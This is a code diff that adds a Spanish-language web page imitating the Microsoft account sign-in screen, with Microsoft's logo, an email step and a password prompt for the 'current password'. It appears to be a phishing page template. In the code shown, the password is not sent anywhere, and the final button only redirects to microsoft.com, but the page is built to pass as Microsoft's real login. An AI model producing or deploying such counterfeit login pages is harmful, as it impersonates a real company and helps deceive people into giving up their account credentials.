@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Microsoft</title>
+    <style>
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-image: linear-gradient(to right, #f6f6f6, #e7e7e7);
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            width: 400px;
+            max-width: 90%;
+            text-align: left;
+            box-sizing: border-box;
+        }
+        .logo {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 140px;
+            height: auto;
+        }
+        h1 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        p {
+            margin: 5px 0;
+            font-size: 14px;
+            color: #333;
+        }
+        .login-container input[type="text"], .login-container input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 14px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .login-container button:hover {
+            background-color: #005a9e;
+        }
+        .login-container .link {
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .login-container .link:hover {
+            text-decoration: underline;
+        }
+        .sub-text {
+            margin-bottom: 20px;
+            font-size: 12px;
+            color: #333;
+            display: block;
+        }
+        .footer-links {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #6e6e6e;
+            text-align: center;
+        }
+        .footer-links a {
+            color: #6e6e6e;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .password-screen {
+            display: none;
+        }
+        .back-arrow {
+            display: inline-block;
+            margin-bottom: 10px;
+            font-size: 14px;
+            color: #0078d4;
+            cursor: pointer;
+        }
+        .back-arrow:hover {
+            text-decoration: underline;
+        }
+        .email-display {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="email-screen">
+        <div class="logo">
+            <img src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" alt="Microsoft Logo">
+        </div>
+        <h1>Iniciar sesión</h1>
+        <form id="email-form">
+            <label for="email">Correo electrónico, teléfono o Skype</label>
+            <input type="text" id="email" name="email" placeholder="Correo electrónico, teléfono o Skype" required>
+            <a href="#" class="link">¿No tiene ninguna cuenta? Cree una.</a><br>
+            <a href="#" class="link">¿No puede acceder a su cuenta?</a>
+            <button type="button" onclick="showPasswordScreen()">Siguiente</button>
+        </form>
+        <div class="footer-links">
+            <a href="#">Términos de uso</a> | 
+            <a href="#">Privacidad y cookies</a>
+        </div>
+    </div>
+
+    <div class="login-container password-screen" id="password-screen">
+        <div class="logo">
+            <img src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" alt="Microsoft Logo">
+        </div>
+        <div class="back-arrow" onclick="showEmailScreen()">
+            &larr; <span id="email-display">correo@ejemplo.com</span>
+        </div>
+        <h1>Introduce contraseña actual</h1>
+        <form id="password-form">
+            <input type="hidden" name="email" id="email-hidden">
+            <label for="password">Contraseña</label>
+            <input type="password" id="password" name="password" placeholder="Contraseña Actual" required>
+            <a href="#" class="link">He olvidado mi contraseña</a><br>
+            <button type="button" onclick="redirectToMicrosoft()">Iniciar sesión</button>
+        </form>
+        <div class="footer-links">
+            <a href="#">Términos de uso</a> | 
+            <a href="#">Privacidad y cookies</a>
+        </div>
+    </div>
+
+    <script>
+        function showPasswordScreen() {
+            var emailInput = document.querySelector('input[name="email"]');
+            var email = emailInput.value;
+            if (validateEmail(email)) {
+                document.getElementById('email-hidden').value = email;
+                document.getElementById('email-display').innerText = email;
+                document.getElementById('email-screen').style.display = 'none';
+                document.getElementById('password-screen').style.display = 'block';
+            } else {
+                alert('Por favor, introduzca un correo electrónico válido.');
+                emailInput.focus();
+            }
+        }
+
+        function showEmailScreen() {
+            document.getElementById('password-screen').style.display = 'none';
+            document.getElementById('email-screen').style.display = 'block';
+        }
+
+        function redirectToMicrosoft() {
+            window.location.href = "https://www.microsoft.com";
+        }
+
+        function validateEmail(email) {
+            var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+    </script>
+</body>
+</html>
